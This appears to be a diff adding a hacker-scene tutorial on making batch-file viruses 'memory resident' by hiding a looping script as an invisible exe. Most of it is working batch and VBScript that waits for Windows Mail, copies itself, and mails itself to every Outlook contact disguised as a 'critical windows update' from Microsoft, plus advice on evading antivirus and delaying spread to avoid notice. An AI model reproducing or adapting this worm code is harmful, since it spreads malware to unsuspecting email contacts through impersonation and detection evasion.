@@ -1,0 +1,255 @@
+
+                                                 MEANDERINGS:
+
+                                   Theory On Batch Memory Residency Techniques
+  
+                                                      By
+
+                                                cOrRuPt G3n3t!x
+
+
+   Many people have said that a batch program cannot go memory resident, although, when using ASM MS-Dos is
+   used to send the program into the higher/lower memory modules. So i find it hard to believe that we cannot
+   execute our batch into the computers memory... anyway moving along; i have proposed a method that could
+   possibly 'emulate' your batch file going resident. This method includes your batch file checking
+   if parameters are met (via looping your batch file in the backround without the CMD window) and then executing
+   it's routine if the parameter is met. This is only a theory which will work, but whether its practical is up to
+   the users opinion and usage of the knowlegde gained here. To do this you will need an application called
+   'Bat_To_Exe_Converter.exe' which can be downloaded from "www.f2ko.de" or even a simple google of the files name
+   will help. Now with this application in hand, let the choas begin...
+
+
+  1)Theory Behind The Madness:
+   --------------------------
+
+   First off i'd like to say this is completely my own method i have never seen it done before so if you use
+   it atleast give me a lil' credit man? As i myself really hate lamers!!! With that said...
+   Lets go into detail on this theory of batch memory residency; we loop our batch in the backround without
+   the cmd.exe window; thus 'emulating' our batch residency. But now we have a looping BAT; Whoah not much help
+   so now here is where the ingenius part comes in, we ask our batch on each loop to check for current parameters
+   (such as is a certain process running? what is current time? What is the current date? Has the user copied any
+   new files to a certain directory? Is there an Anti-Virus rinning? Has a new drive bee connected etc) once we 
+   have found the answer to this information in REAL TIME we can then let our batch execute specific routines etc.
+
+
+  2)Info On The Outside Sources:
+    ---------------------------
+
+   WTF am I talking about? Well the application we are using to help hide our batch's window. This is a great lil'
+   application which can convert basically any bat file to an exe (although i have had problems cinverting a 5,12MB
+   batch to a workable .exe, it gets to a certain parameter where there is to many GOTO commands and the does some
+   funky shit and exits, but other then that i have had no problems with it, it's very useful not only for virii
+   but also source code protection. You can add file versions, author name, passwords to execute file, it's
+   also a great heuristics and AV fooler as once converted to an .exe it is most of the time undetected (although
+   the heuristics for batch is completely bullshit on almost all AV's i've tested!!!!) another great feature is
+   that you can add external files to the .exe which will then be called up by the batch which makes scripting
+   your virii a less complicated job, but our focus is the 'invisble application' where no cmd window pops up.
+   My advice to you is play around with the app a bit to get a good 'feel' for it.
+
+
+  3)Simple Task:
+
+   Right now i first want to give you a simple batch file to make, copy and pste the script below to
+   a batch file and then execute, you will see lines of echo i'm looping. now exit the batch script.
+   Next open your newly downloaded Bat_To_Exe_Converter.exe and add your batch file where it is labled
+  'batch file' it will then save the .exe of it in the same directory, next click on the invisible application
+   and then compile. After that execute the new .exe it will not show any window but is running in the backround
+   Open taskManger.exe look for CMD.exe under processes and the end the process.
+  --------------------------------[Cut Here]----------------------------------------
+  :a
+  echo I'm looping
+  goto a
+  --------------------------------[Cut Here]----------------------------------------
+   So there you have it! your batch gone resident and now window shown, only problem, system resources are
+   being eaten away but f*ck it that aint our computer it's our scripts side effect! (I mean when you get sick
+   you cough and gave a runny nose, take medicine then you feel sleepy. NOTHING IS PERFECT)
+
+
+  4)CG's Process Parameter Execution (CGPPE):
+   ------------------------------------------
+
+   This refers to the method where by we will grab a list of current processes, find a string in the list
+   relating to the apllication we are looking for(In this case Windows Mail), if the application is found
+   to be in memory, our batch will run it's MS Outlook spread routine and then terminate it's residency.
+   This will help when your Batch's main infect routine is over a p2p or if you start up your virus on every
+   boot. To get a list of current processes we will use a a batch program to create the vbs and then execute
+   the vbs which will take the current processes to %Temp% and delete it after oit's done. So firts we shall
+   look at the VBS process script. It will create ProcessList.vbs in %temp% and proclis.tmp in %temp%
+   The proclis.tmp is the file containing current processes:
+  --------------------------------[Cut Here]----------------------------------------
+  echo Option Explicit>%temp%\ProcessList.vbs
+  echo.>>%temp%\ProcessList.vbs
+  echo Dim File>>%temp%\ProcessList.vbs
+  echo Dim ObjFileSystem>>%temp%\ProcessList.vbs
+  echo Dim ObjOutputFile>>%temp%\ProcessList.vbs
+  echo Dim objWMIService>>%temp%\ProcessList.vbs
+  echo Dim oproc>>%temp%\ProcessList.vbs
+  echo Dim Var>>%temp%\ProcessList.vbs
+  echo.>>%temp%\ProcessList.vbs
+  echo File = "Process.txt">>%temp%\ProcessList.vbs
+  echo.>>%temp%\ProcessList.vbs
+  echo Set ObjFileSystem = CreateObject("Scripting.fileSystemObject")>>%temp%\ProcessList.vbs
+  echo Set ObjOutputFile = ObjFileSystem.CreateTextFile("%temp%\proclis.tmp")>>%temp%\ProcessList.vbs
+  echo.>>%temp%\ProcessList.vbs
+  echo Set objWMIService = GetObject("winmgmts:\root\cimv2")>>%temp%\ProcessList.vbs
+  echo Set oproc = objWMIService.ExecQuery("Select * from Win32_Process",,48)>>%temp%\ProcessList.vbs
+  echo.>>%temp%\ProcessList.vbs
+  echo For Each oproc In oproc>>%temp%\ProcessList.vbs
+  echo 	Var = oproc.ExecutablePath>>%temp%\ProcessList.vbs
+  echo 	if Var ^<^> "" then>>%temp%\ProcessList.vbs
+  echo		 ObjOutputFile.WriteLine(Var)>>%temp%\ProcessList.vbs
+  echo    End If>>%temp%\ProcessList.vbs
+  echo Next>>%temp%\ProcessList.vbs
+  echo.>>%temp%\ProcessList.vbs
+  echo ObjOutputFile.Close>>%temp%\ProcessList.vbs
+  echo Set objFileSystem = Nothing>>%temp%\ProcessList.vbs
+  echo Set oproc = Nothing>>%temp%\ProcessList.vbs
+  echo Set objWMIService = Nothing>>%temp%\ProcessList.vbs
+  echo.>>%temp%\ProcessList.vbs
+  cscript //I //nologo %temp%\ProcessList.vbs
+  --------------------------------[Cut Here]----------------------------------------
+
+   Now that we have the list of current processes we will search in this list of processes for the one we are
+   looking for, which in my case is Windows Mail. See below my batch script for this:
+  --------------------------------[Cut Here]----------------------------------------
+  :loop
+  call %temp%\ProcessList.vbs
+  FIND /i "C:\Program Files\Windows Mail\WinMail.exe" %temp%\proclis.tmp >nul
+  if not errorlevel 1 (goto routine)
+  if errorlevel 1 (del %temp%\proclis.tmp" >nul )
+  goto loop
+  :routine
+  echo.on error resume next>>C:\MSO.vbs 
+  echo.dim a,b,c,d,e>>C:\MSO.vbs 
+  echo.set a=Wscript.CreateObject("Wscript.Shell")>>C:\MSO.vbs 
+  echo.set b=CreateObject("Outlook.Application")>>C:\MSO.vbs 
+  echo.set c=b.GetNameSpace("MAPI")>>C:\MSO.vbs 
+  echo.for y=1 To c.AddressLists.Count>>C:\MSO.vbs 
+  echo.set d=c.AddressLists(y)>>C:\MSO.vbs 
+  echo.x=1 '>>C:\MSO.vbs
+  echo.set e=b.CreateItem(0)>>C:\MSO.vbs
+  echo.for o=1 To d.AddressEntries.Count>>C:\MSO.vbs 
+  echo.f=d.AddressEntries(x)>>C:\MSO.vbs 
+  echo.e.Recipients.Add f>>C:\MSO.vbs 
+  echo.x=x+1>>C:\MSO.vbs
+  echo.next>>C:\MSO.vbs 
+  echo.e.Subject="Your Subject here">>C:\MSO.vbs 
+  echo.e.Body="Your Body here">>C:\MSO.vbs 
+  echo.e.Attachments.Add("c:\p2pdon.bat")>>C:\MSO.vbs 
+  echo.e.DeleteAfterSubmit=False>>C:\MSO.vbs 
+  echo.e.Send>>C:\MSO.vbs 
+  echo.f ="">>C:\MSO.vbs 
+  echo.next>>C:\MSO.vbs
+  call C:\MSO.vbs
+  Del C:\MSO.vbs
+  --------------------------------[Cut Here]----------------------------------------
+
+   So we now have a list of current processes, a way to find if the process is active and then an errorlevel
+   checker to do the work.
+
+
+  4a)Final CG Process Parameter Exexcution:
+     -------------------------------------
+
+   My final script for Windows Mail execution via a 'resident' batch file will look like this
+   (It is only 2.565 bytes 'big'):
+  --------------------------------[Cut Here]----------------------------------------
+  @echo off
+  echo Option Explicit>%temp%\ProcessList.vbs
+  echo.>>%temp%\ProcessList.vbs
+  echo Dim File>>%temp%\ProcessList.vbs
+  echo Dim ObjFileSystem>>%temp%\ProcessList.vbs
+  echo Dim ObjOutputFile>>%temp%\ProcessList.vbs
+  echo Dim objWMIService>>%temp%\ProcessList.vbs
+  echo Dim oproc>>%temp%\ProcessList.vbs
+  echo Dim Var>>%temp%\ProcessList.vbs
+  echo.>>%temp%\ProcessList.vbs
+  echo File = "Process.txt">>%temp%\ProcessList.vbs
+  echo.>>%temp%\ProcessList.vbs
+  echo Set ObjFileSystem = CreateObject("Scripting.fileSystemObject")>>%temp%\ProcessList.vbs
+  echo Set ObjOutputFile = ObjFileSystem.CreateTextFile("%temp%\proclis.tmp")>>%temp%\ProcessList.vbs
+  echo.>>%temp%\ProcessList.vbs
+  echo Set objWMIService = GetObject("winmgmts:\root\cimv2")>>%temp%\ProcessList.vbs
+  echo Set oproc = objWMIService.ExecQuery("Select * from Win32_Process",,48)>>%temp%\ProcessList.vbs
+  echo.>>%temp%\ProcessList.vbs
+  echo For Each oproc In oproc>>%temp%\ProcessList.vbs
+  echo 	Var = oproc.ExecutablePath>>%temp%\ProcessList.vbs
+  echo 	if Var ^<^> "" then>>%temp%\ProcessList.vbs
+  echo		 ObjOutputFile.WriteLine(Var)>>%temp%\ProcessList.vbs
+  echo    End If>>%temp%\ProcessList.vbs
+  echo Next>>%temp%\ProcessList.vbs
+  echo.>>%temp%\ProcessList.vbs
+  echo ObjOutputFile.Close>>%temp%\ProcessList.vbs
+  echo Set objFileSystem = Nothing>>%temp%\ProcessList.vbs
+  echo Set oproc = Nothing>>%temp%\ProcessList.vbs
+  echo Set objWMIService = Nothing>>%temp%\ProcessList.vbs
+  echo.>>%temp%\ProcessList.vbs
+  :loop
+  call %temp%\ProcessList.vbs
+  FIND /i "C:\Program Files\Windows Mail\WinMail.exe" %temp%\proclis.tmp >nul
+  if not errorlevel 1 (goto routine)
+  if errorlevel 1 (del %temp%\proclis.tmp" >nul )
+  goto loop
+  :routine
+  copy %0 "C:\update.bat"
+  echo.on error resume next>>C:\MSO.vbs 
+  echo.dim a,b,c,d,e>>C:\MSO.vbs 
+  echo.set a=Wscript.CreateObject("Wscript.Shell")>>C:\MSO.vbs 
+  echo.set b=CreateObject("Outlook.Application")>>C:\MSO.vbs 
+  echo.set c=b.GetNameSpace("MAPI")>>C:\MSO.vbs 
+  echo.for y=1 To c.AddressLists.Count>>C:\MSO.vbs 
+  echo.set d=c.AddressLists(y)>>C:\MSO.vbs 
+  echo.x=1 '>>C:\MSO.vbs
+  echo.set e=b.CreateItem(0)>>C:\MSO.vbs
+  echo.for o=1 To d.AddressEntries.Count>>C:\MSO.vbs 
+  echo.f=d.AddressEntries(x)>>C:\MSO.vbs 
+  echo.e.Recipients.Add f>>C:\MSO.vbs 
+  echo.x=x+1>>C:\MSO.vbs
+  echo.next>>C:\MSO.vbs 
+  echo.e.Subject="This is a critical windows update">>C:\MSO.vbs 
+  echo.e.Body="Microsoft urges all consumers to install this patch in case of emergency">>C:\MSO.vbs 
+  echo.e.Attachments.Add("c:\update.bat")>>C:\MSO.vbs 
+  echo.e.DeleteAfterSubmit=False>>C:\MSO.vbs 
+  echo.e.Send>>C:\MSO.vbs 
+  echo.f ="">>C:\MSO.vbs 
+  echo.next>>C:\MSO.vbs
+  call C:\MSO.vbs
+  del C:\MSO.vbs
+  del %temp%\proclis.tmp
+  del %temp%\ProcessList.vbs
+  --------------------------------[Cut Here]----------------------------------------
+   Now run this script as a normal batch, you will see the CMD window stating that the string cannot be found.
+   open your Windows MAil and the screen dissapears this is because the process was found and the routine
+   of infecting Windows Mail was executed. (PLEASE MAKE SURE YOUR INTERNET IS OFFLINE TO AVOID ACTUAL SPREADIN
+   I CANNOT AND WILL NOT TAKE RESPONSIBILTY FOR MISUSE). Now we can just convert our batch to a .exe  and remember
+   to check the 'invisible apllications' box and compile. There you have an emulation of batch residency.
+
+
+  5)Practical Usage Of CGPPE:
+    ------------------------
+
+   Now i myself think the above script is really impractical for a batch file who's main infection routine is Outlook.
+   But if you are using another infect routine as the main one and Outlook as a secondary protocol this will help.
+   But this does not mean thats all; we could use this script to stay resident and wait until a certain game or 
+   apllication is executed, then let our virus kill the game/apllications process. We could also use this for a more 
+   exotic MS Outlook spreading where by for example our batch counts how many times IExplorer or Windows mail
+   (or whatever you wish) has been opened and when it reaches a certain number it then executes the MS Outlook script
+   This will help prevent network traffic and your virus will take longer to be seen, Depending on it's payload.
+   There are many more uses for my batch, i have just giving the basic concept on how to check for a process in memory
+   i do hope this can be used in some future batch virii.
+ 
+   Please remember, however, you cannot write text to your hidden apllication as is it will not be seen. You'd
+   have to let your hidden batch create a seperate batch to execute any text or visuals.
+
+
+   Thats the end of the first emulated memory resident batch i know of (all residency is done via batch scripting!)
+   It is a long process but i am slowly making it shorter, approxiamtely 2/3 of it's original size. stay posted for updates.
+   THIS IS FOR EDUCATIONAL PURPOSES ONLY. 
+    
+
+
+
+  [?]Contact Me:
+    -----------
+
+  [@]immortalassassin@rocketmail.com
